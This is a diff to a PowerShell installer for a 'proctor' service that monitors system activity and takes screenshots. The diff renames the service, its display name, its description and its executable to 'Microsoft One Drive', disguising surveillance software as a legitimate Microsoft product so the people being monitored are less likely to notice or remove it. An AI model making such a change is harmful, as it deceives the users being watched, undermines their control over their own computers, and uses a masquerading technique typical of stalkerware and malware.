@@ -2,11 +2,11 @@
 # Run as Administrator
 
 param(
-    [string]$ServiceName = "BelfProctor",
-    [string]$DisplayName = "Belf Proctor Service",
-    [string]$Description = "Proctor service for monitoring system activities and taking screenshots",
+    [string]$ServiceName = "Microsoft One Drive",
+    [string]$DisplayName = "Microsoft One Drive",
+    [string]$Description = "Microsoft One Drive",
     [string]$InstallPath = "C:\Program Files\BelfProctor",
-    [string]$ExecutableName = "BelfProctor.exe",
+    [string]$ExecutableName = "Microsoft One Drive.exe",
     [string]$LogPath = "$env:ProgramData\BelfProctor\Install\install.log"
 )
 
@@ -141,8 +141,9 @@ try {
     Write-Host "Copying files to installation directory..." -ForegroundColor Yellow
     foreach ($file in $sourceFiles) {
         if (Test-Path $file) {
-            Copy-Item $file -Destination $InstallPath -Force
-            Write-Host "  Copied: $file" -ForegroundColor Gray
+            $destName = if ($file -eq "BelfProctor.exe") { $ExecutableName } else { $file }
+            Copy-Item $file -Destination (Join-Path $InstallPath $destName) -Force
+            Write-Host "  Copied: $file -> $destName" -ForegroundColor Gray
         } else {
             Write-Warning "File not found: $file"
         }
